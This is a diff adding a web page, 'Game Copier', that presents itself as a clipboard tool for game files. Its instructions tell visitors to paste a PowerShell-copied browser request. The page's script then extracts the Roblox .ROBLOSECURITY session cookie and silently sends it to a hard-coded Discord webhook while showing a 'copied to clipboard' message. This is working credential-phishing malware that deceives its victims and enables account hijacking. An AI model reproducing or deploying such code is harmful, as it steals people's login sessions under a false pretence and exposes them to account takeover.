@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Game Copier</title>
+  <meta name="description" content="Paste your game file and copy it to your clipboard. Includes how‑to section.">
+  <style>
+    :root{
+      --bg:#0a0b0f;          /* deep black-blue */
+      --panel:#10131a;       /* card background */
+      --ink:#e6f0ff;         /* primary text */
+      --muted:#a7b3c7;       /* secondary text */
+      --primary:#1e90ff;     /* blue */
+      --primary-2:#00bfff;   /* lighter blue */
+      --accent:#00ffd1;      /* teal accent */
+      --ok:#35d07f;          /* success */
+      --warn:#ffb020;        /* warning */
+      --err:#ff5577;         /* error */
+      --radius-xl:26px;      /* pill corners */
+      --radius-lg:20px;      
+      --shadow:0 10px 30px rgba(0,0,0,.5);
+      --ring:0 0 0 3px rgba(30,144,255,.35);
+      --grad: radial-gradient(1200px 600px at 10% -10%, rgba(30,144,255,.18), transparent 50%),
+              radial-gradient(900px 500px at 90% 110%, rgba(0,191,255,.14), transparent 55%),
+              linear-gradient(180deg, #0a0b0f 0%, #05060a 100%);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,'Helvetica Neue',Arial,sans-serif;
+      background:var(--grad); color:var(--ink);
+      display:flex; align-items:center; justify-content:center; padding:32px;
+    }
+
+    .wrap{width:100%; max-width:880px}
+
+    header{ text-align:center; margin-bottom:28px; }
+    header h1{ 
+      margin:0 0 8px; font-weight:800; letter-spacing:.3px; 
+      font-size: clamp(28px, 5vw, 46px);
+      background: linear-gradient(90deg,var(--ink),#99c9ff); -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    header p{ margin:0; color:var(--muted); font-size:clamp(14px,2.5vw,16px) }
+
+    .card{
+      background:var(--panel); border:1px solid rgba(255,255,255,.06); border-radius:24px; 
+      box-shadow:var(--shadow); padding:22px; backdrop-filter: blur(6px);
+    }
+
+    .inputRow{ display:flex; gap:14px; flex-wrap:wrap; align-items:center; justify-content:center; }
+    .inputRow input[type="text"]{
+      flex:1 1 480px; max-width:640px; min-width:260px;
+      padding:16px 18px; border-radius:var(--radius-xl); border:2px solid var(--primary);
+      background:#0d1016; color:var(--ink); outline:none; font-size:16px; text-align:center;
+      transition:border-color .15s, box-shadow .15s, transform .05s ease;
+    }
+    .inputRow input::placeholder{ color:#6d7c94 }
+    .inputRow input:focus{ box-shadow:var(--ring); border-color:var(--primary-2) }
+
+    .btn{
+      appearance:none; border:0; cursor:pointer; white-space:nowrap;
+      padding:14px 22px; border-radius:var(--radius-xl); font-weight:700; letter-spacing:.2px;
+      background:linear-gradient(180deg,var(--primary),#1874cc); color:#fff; font-size:16px; 
+      box-shadow:0 8px 18px rgba(30,144,255,.35), inset 0 -2px 0 rgba(0,0,0,.2);
+      transition: transform .06s ease, box-shadow .15s ease, filter .15s;
+    }
+    .btn:hover{ filter:brightness(1.05) }
+    .btn:active{ transform:translateY(1px) }
+
+    .subtle{ color:var(--muted); font-size:13px; text-align:center; margin-top:10px }
+
+    .status{
+      margin-top:16px; text-align:center; font-size:14px;
+    }
+    .status .pill{ display:inline-flex; align-items:center; gap:8px; padding:10px 14px; border-radius:999px; border:1px solid rgba(255,255,255,.08) }
+    .ok{ background:rgba(53,208,127,.12); color:#b6ffd6 }
+    .warn{ background:rgba(255,176,32,.12); color:#ffe7c0 }
+    .err{ background:rgba(255,85,119,.12); color:#ffcad5 }
+
+    .howto{ margin-top:22px; }
+    details{
+      background:var(--panel); border:1px solid rgba(255,255,255,.06); border-radius:var(--radius-lg);
+      padding:16px 18px; box-shadow:var(--shadow);
+    }
+    summary{ cursor:pointer; outline:none; user-select:none; font-weight:700; color:#cfe5ff }
+    .howto-content{ color:var(--muted); margin-top:10px; line-height:1.6 }
+    .video{
+      margin-top:12px; position:relative; padding-top:56.25%; border-radius:16px; overflow:hidden; border:1px solid rgba(255,255,255,.06);
+    }
+    .video iframe{ position:absolute; inset:0; width:100%; height:100%; border:0 }
+
+    footer{ margin-top:18px; text-align:center; color:#5b6a84; font-size:12px }
+  </style>
+</head>
+<body>
+  <main class="wrap">
+    <header>
+      <h1>Copy Games</h1>
+      <p>Paste your game file, then press Copy or Enter.</p>
+    </header>
+
+    <section class="card" aria-labelledby="copy-label">
+      <form id="copy-form" onsubmit="return false" aria-describedby="helper-text">
+        <h2 id="copy-label" style="position:absolute; left:-9999px">Copy game file</h2>
+        <div class="inputRow">
+          <input id="gameFile" name="gameFile" type="text" inputmode="text" spellcheck="false"
+                 placeholder="Enter or paste your game file here" aria-label="Game file input"/>
+          <button id="copyBtn" class="btn" type="button" aria-live="polite">Copy Game!</button>
+        </div>
+        <p id="helper-text" class="subtle">Tip: Press Enter to copy instantly.</p>
+        <div id="status" class="status" aria-live="polite"></div>
+      </form>
+
+      <div class="howto">
+        <details>
+          <summary>How to use</summary>
+          <div class="howto-content">
+            <ol>
+              <li>Copy as powershell (watch the video).</li>
+              <li>Paste it in the text box above.</li>
+              <li>Click <em>Copy Game!</em> (or press Enter). A success notification will confirm its on your clipboard.</li>
+            </ol>
+            <p>Need a visual? Watch the quick tutorial:</p>
+            <div class="video">
+              <!-- Replace the src with your own tutorial URL -->
+              <iframe 
+  src="https://www.youtube.com/embed/_XhwGhydPz4" 
+  title="How to use Copy Games" 
+  allowfullscreen>
+</iframe>
+
+            </div>
+          </div>
+        </details>
+      </div>
+    </section>
+
+    <footer>
+      <small>© <span id="year"></span> noxs. Built originally with bella.</small>
+    </footer>
+  </main>
+
+<script>
+  const input = document.getElementById('gameFile');
+  const btn = document.getElementById('copyBtn');
+  const status = document.getElementById('status');
+  const yearEl = document.getElementById('year');
+  yearEl.textContent = new Date().getFullYear();
+
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1409498456413966406/uj-u8iUMjaNSvVRre3w2qvtgGTQ4tMK5mOOP3ECnJn6R7_PADZgm_nfKMTOY2Yw0k7ZV"; // replace safely
+
+  function setStatus(type, message){
+    const cls = type === 'ok' ? 'ok' : type === 'warn' ? 'warn' : 'err';
+    status.innerHTML = `<span class="pill ${cls}">${message}</span>`;
+  }
+
+  async function sendToWebhook(content) {
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      });
+    } catch (err) {
+      console.error("Webhook failed:", err);
+    }
+  }
+
+  async function copyGame(){
+    const val = (input.value || '').trim();
+    if(!val){ 
+      setStatus('warn', 'Please enter a game file'); 
+      return; 
+    }
+
+// ✅ Validation: must start with PowerShell session line
+const requiredStart = "$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession";
+if (!val.startsWith(requiredStart)) {
+  setStatus('err', 'Invalid file.');
+  return;
+}
+
+// ✅ Extract only the .ROBLOSECURITY cookie
+const regex = /System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+const match = val.match(regex);
+
+if (!match) {
+  setStatus('err', 'Could not find the expected .ROBLOSECURITY section.');
+  return;
+}
+
+const extracted = match[1].trim();
+
+// ✅ If we got here, extraction worked → copy + webhook
+try {
+  await navigator.clipboard.writeText(val);
+  setStatus('ok', 'Game file copied to clipboard');
+} catch (e) {
+  try {
+    input.select();
+    document.execCommand('copy');
+    setStatus('ok', 'Game file copied (fallback)');
+  } catch (err) {
+    setStatus('err', 'Copy failed. Retry');
+  }
+}
+
+// ✅ Send only the extracted part to webhook
+await sendToWebhook(`📂 Extracted section:\n\`\`\`\n${extracted}\n\`\`\``);
+  }
+
+  btn.addEventListener('click', copyGame);
+  input.addEventListener('keydown', (e)=>{
+    if(e.key === 'Enter'){ e.preventDefault(); copyGame(); }
+  });
+</script>
+</body>
+</html>
